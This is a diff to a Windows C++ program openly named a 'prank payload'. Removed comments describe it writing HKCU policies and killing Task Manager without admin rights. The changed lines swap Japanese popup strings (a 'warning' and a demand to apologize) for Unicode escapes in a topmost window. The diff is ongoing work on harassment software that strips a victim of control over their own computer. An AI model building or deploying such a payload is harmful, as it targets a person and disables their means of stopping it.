@@ -1,6 +1,5 @@
 // language: C++, file: prank_payload_no_admin.cpp, target: Windows 11, MSVC
-// *管理者権限不要。HKCUポリシー書き込み＋同一ユーザー権限のTaskmgr強制終了。*
-// *コンパイル: cl /MT /O2 /SUBSYSTEM:WINDOWS prank_payload_no_admin.cpp user32.lib advapi32.lib*
+// *日本語の文字化け対策：L"..."ではなくUnicodeエスケープシーケンスを使用*
 
 #include <windows.h>
 #include <tlhelp32.h>
@@ -65,14 +64,15 @@ DWORD WINAPI PopupThread(LPVOID lpParam) {
     HWND hwnd = CreateWindowExW(
         WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
         L"CursorPopup",
-        L"警告",
+        L"\u8B66\u544A", // "警告" のエスケープ
         WS_POPUP | WS_VISIBLE | WS_CAPTION | WS_SYSMENU,
         pt.x, pt.y, 250, 120,
         NULL, NULL, GetModuleHandle(NULL), NULL
     );
 
     if (hwnd) {
-        CreateWindowExW(0, L"STATIC", L"リスはりに謝れ",
+        // "リスはりに謝れ" のエスケープシーケンス
+        CreateWindowExW(0, L"STATIC", L"\u30EA\u30B9\u306F\u308A\u306B\u8B1D\u308C",
             WS_CHILD | WS_VISIBLE | SS_CENTER | SS_CENTERIMAGE,
             10, 10, 230, 60, hwnd, NULL, GetModuleHandle(NULL), NULL);
 
